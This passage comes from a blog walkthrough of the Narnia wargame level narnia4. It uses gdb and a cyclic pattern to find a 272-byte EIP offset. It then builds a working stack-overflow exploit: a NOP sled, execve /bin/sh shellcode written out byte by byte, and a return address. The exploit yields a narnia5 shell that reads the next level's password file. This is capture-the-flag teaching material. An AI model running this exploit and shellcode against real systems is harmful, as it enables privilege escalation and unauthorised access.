Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Starting program: /games/narnia/narnia4 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5
Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4
Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3
Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
0x316a4130 in ?? ()</span>
</pre>
<pre class="code console literal-block">
<span class="go">local $] ./pattern.py 0x316a4130
Pattern 0x316a4130 first occurrence at position 272 in pattern.</span>
</pre>
<p>This tells us we have 272 bytes to play with. Plenty of space to construct
a nopsled and shellcode payload. Let's find out what we need to write into
<code>EIP</code>.</p>
<pre class="code console literal-block">
<span class="go">(gdb) r $(python -c &quot;print 'a'*272 + 'bbbb'&quot;)
Starting program: /games/narnia/narnia4 $(python -c &quot;print 'a'*272 + 'bbbb'&quot;)

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
0xffffd5c0:     0x00000000      0xffffd654      0xffffd660      0xf7feacea
0xffffd5d0:     0x00000002      0xffffd654      0xffffd5f4      0x080497cc
0xffffd5e0:     0x0804825c      0xf7fca000      0x00000000      0x00000000
0xffffd5f0:     0x00000000      0x7cc8a421      0x44f76031      0x00000000
0xffffd600:     0x00000000      0x00000000      0x00000002      0x080483b0
0xffffd610:     0x00000000      0xf7ff0500      0xf7e3c979      0xf7ffd000
0xffffd620:     0x00000002      0x080483b0      0x00000000      0x080483d1
0xffffd630:     0x080484ad      0x00000002      0xffffd654      0x08048550
0xffffd640:     0x080485c0      0xf7feb180      0xffffd64c      0x0000001c
0xffffd650:     0x00000002      0xffffd78f      0xffffd7a5      0x00000000
0xffffd660:     0xffffd8ba      0xffffd8ce      0xffffd8de      0xffffd8f1
0xffffd670:     0xffffd914      0xffffd927      0xffffd930      0xffffd93d
0xffffd680:     0xffffde5e      0xffffde69      0xffffde75      0xffffded3
0xffffd690:     0xffffdeea      0xffffdef9      0xffffdf05      0xffffdf16
0xffffd6a0:     0xffffdf1f      0xffffdf32      0xffffdf3a      0xffffdf4a
0xffffd6b0:     0xffffdf80      0xffffdfa0      0xffffdfc0      0x00000000
0xffffd6c0:     0x00000020      0xf7fdbb60      0x00000021      0xf7fdb000
0xffffd6d0:     0x00000010      0x1f898b75      0x00000006      0x00001000
0xffffd6e0:     0x00000011      0x00000064      0x00000003      0x08048034
0xffffd6f0:     0x00000004      0x00000020      0x00000005      0x00000008
0xffffd700:     0x00000007      0xf7fdc000      0x00000008      0x00000000
0xffffd710:     0x00000009      0x080483b0      0x0000000b      0x000036b4
0xffffd720:     0x0000000c      0x000036b4      0x0000000d      0x000036b4
0xffffd730:     0x0000000e      0x000036b4      0x00000017      0x00000000
0xffffd740:     0x00000019      0xffffd76b      0x0000001f      0xffffdfe2
0xffffd750:     0x0000000f      0xffffd77b      0x00000000      0x00000000
0xffffd760:     0x00000000      0x00000000      0x9e000000      0x9213cb6c
0xffffd770:     0x8eef41b1      0xe0574cc7      0x69a73659      0x00363836
0xffffd780:     0x00000000      0x00000000      0x00000000      0x2f000000
0xffffd790:     0x656d6167      0x616e2f73      0x61696e72      0x72616e2f
0xffffd7a0:     0x3461696e      0x61616100      0x61616161      0x61616161
0xffffd7b0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd7c0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd7d0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd7e0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd7f0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd800:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd810:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd820:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd830:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd840:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd850:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd860:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd870:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd880:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd890:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd8a0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd8b0:     0x61616161      0x62626261      0x00000062      0x00000000
0xffffd8c0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd8d0:     0x00000000      0x00000000      0x00000000      0x00000000</span>
</pre>
<p>Our input starts at around <em>0xffffd7a8</em> so let's get going writing our payload.
Create a nopsled that is <em>272 - 25</em> bytes long, follow that with the
the same shellcode as before, and finish with an address that sits comfortably
in the sled. You normally need to play with the address a bit, as the offsets
inside <em>gdb</em> are a bit different.</p>
<pre class="code console literal-block">
<span class="gp">narnia4&#64;melinda:/narnia$</span> ./narnia4 <span class="sb">`</span>python -c <span class="s2">&quot;print '\x90'*(272-25) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x30\xd8\xff\xff'&quot;</span><span class="sb">`</span>
<span class="gp">$</span> whoami
<span class="go">narnia5
</span><span class="gp">$</span> cat /etc/narnia_pass/narnia5
<span class="go">[password]</span>
</pre>
</div>

    </article>


<hr>
<div class="sharing">
</div>
    <hr>

            </div>
        </div>
    </div>

    <hr>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <ul class="list-inline text-center">
                            <li>
                                <a href="https://github.com/svenito">
                                    <span class="fa-stack fa-lg">
                                        <i class="fa fa-circle fa-stack-2x"></i>
                                        <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                            <li>
                                <a href="https://twitter.com/binaryheadache">
                                    <span class="fa-stack fa-lg">
                                        <i class="fa fa-circle fa-stack-2x"></i>
                                        <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                            <li>
                                <a href="/post/index.xml">
                                    <span class="fa-stack fa-lg">
                                        <i class="fa fa-circle fa-stack-2x"></i>
                                        <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                    </ul>
<p class="copyright text-muted">
    Blog powered by <a href="http://getpelican.com">Pelican</a>,
    which takes great advantage of <a href="http://python.org">Python</a>.
</p>                </div>
            </div>
        </div>
    </footer>

    <!-- jQuery -->
    <script src="/theme/js/jquery.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="/theme/js/bootstrap.min.js"></script>

        <!-- Custom Theme JavaScript -->
        <script src="/theme/js/clean-blog.min.js"></script>

<script type="text/javascript">
    var disqus_shortname = 'unlogic';
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>
</body>

</html>